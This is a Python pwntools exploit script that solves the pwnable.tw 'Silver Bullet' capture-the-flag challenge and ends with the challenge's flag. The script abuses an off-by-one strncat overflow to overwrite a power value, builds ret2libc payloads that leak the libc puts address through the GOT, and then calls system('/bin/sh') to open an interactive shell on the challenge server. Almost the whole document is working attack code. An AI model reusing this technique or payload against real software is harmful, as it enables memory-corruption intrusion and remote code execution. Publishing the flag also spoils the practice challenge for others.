#!/usr/bin/env python3

from pwn import *

exe = ELF("./silver_bullet_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = connect("chall.pwnable.tw", 10103)

    return r


def main():
    r = conn()
    input()
  # puts("+++++++++++++++++++++++++++");
  # puts("       Silver Bullet       ");
  # puts("+++++++++++++++++++++++++++");
  # puts(" 1. Create a Silver Bullet ");
  # puts(" 2. Power up Silver Bullet ");
  # puts(" 3. Beat the Werewolf      ");
  # puts(" 4. Return                 ");
  # puts("+++++++++++++++++++++++++++");
    # good luck pwning :)
    def create_bullet(description):
        r.sendlineafter(b'Your choice :', b'1') 
        r.sendlineafter(b'bullet :', description)
    def powerup_bullet(description):
        r.sendlineafter(b'Your choice :', b'2') 
        r.sendlineafter(b'bullet :', description)
    def beat():
        r.sendlineafter(b'Your choice :', b'3')

    create_bullet(b'A'*0x2f)
    # Because the strncat add a null byte at the end, so we get a Off-by-one bug 
    powerup_bullet(b'B')        # Overflow the 'power' value using Off-by-one bug. The power now should be 1 so we can overflow more
    # Leak libc
    payload = b'\xff\xff\xff'+b'C'*4 + p32(exe.plt['puts'])+p32(exe.sym['main'])+p32(exe.got['puts'])
    powerup_bullet(payload)
    pause()
    beat()
    r.recvuntil(b'Oh ! You win !!\n')
    libc_leak = u32(r.recv(4))
    libc.address = libc_leak - libc.sym['puts']
    info('Libc leak: ' + hex(libc_leak))
    info('Libc address: ' +     hex(libc.address))
    pause()
    # Get shell
    system = libc.sym['system']
    binsh = next(libc.search('/bin/sh'))
    create_bullet(b'A'*0x2f)
    powerup_bullet(b'B')
    payload = b'\xff\xff\xff'+b'C'*4 + p32(system)+p32(exe.sym['main'])+p32(binsh)
    powerup_bullet(payload)
    beat()

    r.interactive()


if __name__ == "__main__":
    main()
# FLAG{uS1ng_S1lv3r_bu1l3t_7o_Pwn_th3_w0rld}
